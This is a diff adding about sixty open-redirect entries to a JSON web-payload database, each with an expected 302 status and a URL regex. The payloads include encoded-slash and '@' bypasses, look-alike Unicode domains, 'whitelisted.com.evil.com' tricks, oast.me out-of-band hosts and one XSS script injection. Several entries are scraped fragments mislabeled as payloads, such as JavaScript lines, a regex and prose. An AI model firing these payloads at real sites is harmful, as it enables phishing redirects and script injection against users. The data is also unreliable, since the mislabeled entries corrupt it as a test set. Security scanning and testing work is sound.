@@ -15695,5 +15695,643 @@
       "expected_status_code": 200,
       "success_regex": ""
     }
+  },
+  {
+    "payload_id": "OWP-242586",
+    "vulnerability_category": "Injection (Open Redirect)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "https://example.com/redirect?url=https://userpreferredsite.com",
+    "validation": {
+      "expected_status_code": 302,
+      "success_regex": "^https?://"
+    }
+  },
+  {
+    "payload_id": "OWP-242587",
+    "vulnerability_category": "Injection (Open Redirect)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "var redirectTo = \"http://trusted.com\";",
+    "validation": {
+      "expected_status_code": 302,
+      "success_regex": "^https?://"
+    }
+  },
+  {
+    "payload_id": "OWP-242588",
+    "vulnerability_category": "Injection (Open Redirect)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "window.location = redirectTo;",
+    "validation": {
+      "expected_status_code": 302,
+      "success_regex": "^https?://"
+    }
+  },
+  {
+    "payload_id": "OWP-242589",
+    "vulnerability_category": "Injection (Open Redirect)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "?checkout_url={payload}",
+    "validation": {
+      "expected_status_code": 302,
+      "success_regex": "^https?://"
+    }
+  },
+  {
+    "payload_id": "OWP-242590",
+    "vulnerability_category": "Injection (Open Redirect)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "?continue={payload}",
+    "validation": {
+      "expected_status_code": 302,
+      "success_regex": "^https?://"
+    }
+  },
+  {
+    "payload_id": "OWP-242591",
+    "vulnerability_category": "Injection (Open Redirect)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "?dest={payload}",
+    "validation": {
+      "expected_status_code": 302,
+      "success_regex": "^https?://"
+    }
+  },
+  {
+    "payload_id": "OWP-242592",
+    "vulnerability_category": "Injection (Open Redirect)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "?destination={payload}",
+    "validation": {
+      "expected_status_code": 302,
+      "success_regex": "^https?://"
+    }
+  },
+  {
+    "payload_id": "OWP-242593",
+    "vulnerability_category": "Injection (Open Redirect)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "?go={payload}",
+    "validation": {
+      "expected_status_code": 302,
+      "success_regex": "^https?://"
+    }
+  },
+  {
+    "payload_id": "OWP-242594",
+    "vulnerability_category": "Injection (Open Redirect)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "?image_url={payload}",
+    "validation": {
+      "expected_status_code": 302,
+      "success_regex": "^https?://"
+    }
+  },
+  {
+    "payload_id": "OWP-242595",
+    "vulnerability_category": "Injection (Open Redirect)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "?next={payload}",
+    "validation": {
+      "expected_status_code": 302,
+      "success_regex": "^https?://"
+    }
+  },
+  {
+    "payload_id": "OWP-242596",
+    "vulnerability_category": "Injection (Open Redirect)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "?redir={payload}",
+    "validation": {
+      "expected_status_code": 302,
+      "success_regex": "^https?://"
+    }
+  },
+  {
+    "payload_id": "OWP-242597",
+    "vulnerability_category": "Injection (Open Redirect)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "?redirect_uri={payload}",
+    "validation": {
+      "expected_status_code": 302,
+      "success_regex": "^https?://"
+    }
+  },
+  {
+    "payload_id": "OWP-242598",
+    "vulnerability_category": "Injection (Open Redirect)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "?redirect_url={payload}",
+    "validation": {
+      "expected_status_code": 302,
+      "success_regex": "^https?://"
+    }
+  },
+  {
+    "payload_id": "OWP-242599",
+    "vulnerability_category": "Injection (Open Redirect)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "?redirect={payload}",
+    "validation": {
+      "expected_status_code": 302,
+      "success_regex": "^https?://"
+    }
+  },
+  {
+    "payload_id": "OWP-242600",
+    "vulnerability_category": "Injection (Open Redirect)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "?return_path={payload}",
+    "validation": {
+      "expected_status_code": 302,
+      "success_regex": "^https?://"
+    }
+  },
+  {
+    "payload_id": "OWP-242601",
+    "vulnerability_category": "Injection (Open Redirect)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "?return_to={payload}",
+    "validation": {
+      "expected_status_code": 302,
+      "success_regex": "^https?://"
+    }
+  },
+  {
+    "payload_id": "OWP-242602",
+    "vulnerability_category": "Injection (Open Redirect)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "?return={payload}",
+    "validation": {
+      "expected_status_code": 302,
+      "success_regex": "^https?://"
+    }
+  },
+  {
+    "payload_id": "OWP-242603",
+    "vulnerability_category": "Injection (Open Redirect)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "?returnTo={payload}",
+    "validation": {
+      "expected_status_code": 302,
+      "success_regex": "^https?://"
+    }
+  },
+  {
+    "payload_id": "OWP-242604",
+    "vulnerability_category": "Injection (Open Redirect)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "?rurl={payload}",
+    "validation": {
+      "expected_status_code": 302,
+      "success_regex": "^https?://"
+    }
+  },
+  {
+    "payload_id": "OWP-242605",
+    "vulnerability_category": "Injection (Open Redirect)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "?target={payload}",
+    "validation": {
+      "expected_status_code": 302,
+      "success_regex": "^https?://"
+    }
+  },
+  {
+    "payload_id": "OWP-242606",
+    "vulnerability_category": "Injection (Open Redirect)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "?url={payload}",
+    "validation": {
+      "expected_status_code": 302,
+      "success_regex": "^https?://"
+    }
+  },
+  {
+    "payload_id": "OWP-242607",
+    "vulnerability_category": "Injection (Open Redirect)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "?view={payload}",
+    "validation": {
+      "expected_status_code": 302,
+      "success_regex": "^https?://"
+    }
+  },
+  {
+    "payload_id": "OWP-242610",
+    "vulnerability_category": "Injection (Open Redirect)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "www.whitelisted.com.evil.com redirect to evil.com",
+    "validation": {
+      "expected_status_code": 302,
+      "success_regex": "^https?://"
+    }
+  },
+  {
+    "payload_id": "OWP-242612",
+    "vulnerability_category": "Injection (Open Redirect)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "?next=whitelisted.com&next=google.com",
+    "validation": {
+      "expected_status_code": 302,
+      "success_regex": "^https?://"
+    }
+  },
+  {
+    "payload_id": "OWP-242613",
+    "vulnerability_category": "Injection (Open Redirect)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://www.theirsite.com@yoursite.com/",
+    "validation": {
+      "expected_status_code": 302,
+      "success_regex": "^https?://"
+    }
+  },
+  {
+    "payload_id": "OWP-242614",
+    "vulnerability_category": "Injection (Open Redirect)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://www.yoursite.com/http://www.theirsite.com/",
+    "validation": {
+      "expected_status_code": 302,
+      "success_regex": "^https?://"
+    }
+  },
+  {
+    "payload_id": "OWP-242615",
+    "vulnerability_category": "Injection (Open Redirect)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://www.yoursite.com/folder/www.folder.com",
+    "validation": {
+      "expected_status_code": 302,
+      "success_regex": "^https?://"
+    }
+  },
+  {
+    "payload_id": "OWP-242616",
+    "vulnerability_category": "Injection (Open Redirect)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://www.yoursite.com?http://www.theirsite.com/",
+    "validation": {
+      "expected_status_code": 302,
+      "success_regex": "^https?://"
+    }
+  },
+  {
+    "payload_id": "OWP-242617",
+    "vulnerability_category": "Injection (Open Redirect)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://www.yoursite.com?folder/www.folder.com",
+    "validation": {
+      "expected_status_code": 302,
+      "success_regex": "^https?://"
+    }
+  },
+  {
+    "payload_id": "OWP-242618",
+    "vulnerability_category": "Injection (Open Redirect)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "https://evil.c℀.example.com . ---> https://evil.ca/c.example.com",
+    "validation": {
+      "expected_status_code": 302,
+      "success_regex": "^https?://"
+    }
+  },
+  {
+    "payload_id": "OWP-242619",
+    "vulnerability_category": "Injection (Open Redirect)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://a.com／X.b.com",
+    "validation": {
+      "expected_status_code": 302,
+      "success_regex": "^https?://"
+    }
+  },
+  {
+    "payload_id": "OWP-396731",
+    "vulnerability_category": "Injection (Open Redirect)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "%2f{target}",
+    "validation": {
+      "expected_status_code": 302,
+      "success_regex": "^https?://"
+    }
+  },
+  {
+    "payload_id": "OWP-396732",
+    "vulnerability_category": "Injection (Open Redirect)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "%2f$2f{target}",
+    "validation": {
+      "expected_status_code": 302,
+      "success_regex": "^https?://"
+    }
+  },
+  {
+    "payload_id": "OWP-396733",
+    "vulnerability_category": "Injection (Open Redirect)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "%2f{target}%2f%2f",
+    "validation": {
+      "expected_status_code": 302,
+      "success_regex": "^https?://"
+    }
+  },
+  {
+    "payload_id": "OWP-396734",
+    "vulnerability_category": "Injection (Open Redirect)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "$2f%2f{target}%2f%2f",
+    "validation": {
+      "expected_status_code": 302,
+      "success_regex": "^https?://"
+    }
+  },
+  {
+    "payload_id": "OWP-396735",
+    "vulnerability_category": "Injection (Open Redirect)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "%2f{target}//",
+    "validation": {
+      "expected_status_code": 302,
+      "success_regex": "^https?://"
+    }
+  },
+  {
+    "payload_id": "OWP-396736",
+    "vulnerability_category": "Injection (Open Redirect)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "?url=http://{target}",
+    "validation": {
+      "expected_status_code": 302,
+      "success_regex": "^https?://"
+    }
+  },
+  {
+    "payload_id": "OWP-396737",
+    "vulnerability_category": "Injection (Open Redirect)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "?url=https://{target}",
+    "validation": {
+      "expected_status_code": 302,
+      "success_regex": "^https?://"
+    }
+  },
+  {
+    "payload_id": "OWP-396738",
+    "vulnerability_category": "Injection (Open Redirect)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "?next=http://{target}",
+    "validation": {
+      "expected_status_code": 302,
+      "success_regex": "^https?://"
+    }
+  },
+  {
+    "payload_id": "OWP-396739",
+    "vulnerability_category": "Injection (Open Redirect)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "?next=https://{target}",
+    "validation": {
+      "expected_status_code": 302,
+      "success_regex": "^https?://"
+    }
+  },
+  {
+    "payload_id": "OWP-396740",
+    "vulnerability_category": "Injection (Open Redirect)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "?url=//{target}",
+    "validation": {
+      "expected_status_code": 302,
+      "success_regex": "^https?://"
+    }
+  },
+  {
+    "payload_id": "OWP-396741",
+    "vulnerability_category": "Injection (Open Redirect)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "?url=$2f%2f{target}",
+    "validation": {
+      "expected_status_code": 302,
+      "success_regex": "^https?://"
+    }
+  },
+  {
+    "payload_id": "OWP-396742",
+    "vulnerability_category": "Injection (Open Redirect)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "?next=//{target}",
+    "validation": {
+      "expected_status_code": 302,
+      "success_regex": "^https?://"
+    }
+  },
+  {
+    "payload_id": "OWP-396743",
+    "vulnerability_category": "Injection (Open Redirect)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "?next=$2f%2f{target}",
+    "validation": {
+      "expected_status_code": 302,
+      "success_regex": "^https?://"
+    }
+  },
+  {
+    "payload_id": "OWP-396752",
+    "vulnerability_category": "Injection (Open Redirect)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "?view={target}",
+    "validation": {
+      "expected_status_code": 302,
+      "success_regex": "^https?://"
+    }
+  },
+  {
+    "payload_id": "OWP-396753",
+    "vulnerability_category": "Injection (Open Redirect)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "?view=/{target}",
+    "validation": {
+      "expected_status_code": 302,
+      "success_regex": "^https?://"
+    }
+  },
+  {
+    "payload_id": "OWP-396754",
+    "vulnerability_category": "Injection (Open Redirect)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "?view=//{target}",
+    "validation": {
+      "expected_status_code": 302,
+      "success_regex": "^https?://"
+    }
+  },
+  {
+    "payload_id": "OWP-396755",
+    "vulnerability_category": "Injection (Open Redirect)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "?view=/\\{target}",
+    "validation": {
+      "expected_status_code": 302,
+      "success_regex": "^https?://"
+    }
+  },
+  {
+    "payload_id": "OWP-396756",
+    "vulnerability_category": "Injection (Open Redirect)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "?view=///{target}",
+    "validation": {
+      "expected_status_code": 302,
+      "success_regex": "^https?://"
+    }
+  },
+  {
+    "payload_id": "OWP-401887",
+    "vulnerability_category": "Injection (Open Redirect)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": ".oast.me",
+    "validation": {
+      "expected_status_code": 302,
+      "success_regex": "^https?://"
+    }
+  },
+  {
+    "payload_id": "OWP-401888",
+    "vulnerability_category": "Injection (Open Redirect)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "%40oast.me",
+    "validation": {
+      "expected_status_code": 302,
+      "success_regex": "^https?://"
+    }
+  },
+  {
+    "payload_id": "OWP-401889",
+    "vulnerability_category": "Injection (Open Redirect)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "@oast.me/",
+    "validation": {
+      "expected_status_code": 302,
+      "success_regex": "^https?://"
+    }
+  },
+  {
+    "payload_id": "OWP-401891",
+    "vulnerability_category": "Injection (Open Redirect)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "?http://www.oast.me/",
+    "validation": {
+      "expected_status_code": 302,
+      "success_regex": "^https?://"
+    }
+  },
+  {
+    "payload_id": "OWP-401893",
+    "vulnerability_category": "Injection (Open Redirect)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "oast.me/",
+    "validation": {
+      "expected_status_code": 302,
+      "success_regex": "^https?://"
+    }
+  },
+  {
+    "payload_id": "OWP-401894",
+    "vulnerability_category": "Injection (Open Redirect)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "oast.me",
+    "validation": {
+      "expected_status_code": 302,
+      "success_regex": "^https?://"
+    }
+  },
+  {
+    "payload_id": "OWP-406878",
+    "vulnerability_category": "Injection (Open Redirect)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "@?(?:[a-zA-Z0-9\\-_\\.@]*)oast\\.me\\/?(\\/|[^.].*)?$",
+    "validation": {
+      "expected_status_code": 302,
+      "success_regex": "^https?://"
+    }
+  },
+  {
+    "payload_id": "OWP-408214",
+    "vulnerability_category": "Injection (Open Redirect)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": ">Download added!<br />Redirecting...</div>",
+    "validation": {
+      "expected_status_code": 302,
+      "success_regex": "^https?://"
+    }
+  },
+  {
+    "payload_id": "OWP-408266",
+    "vulnerability_category": "Injection (Open Redirect)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "&#039;><script>alert(oink)</script>&redirect_url=>",
+    "validation": {
+      "expected_status_code": 302,
+      "success_regex": "^https?://"
+    }
   }
 ]
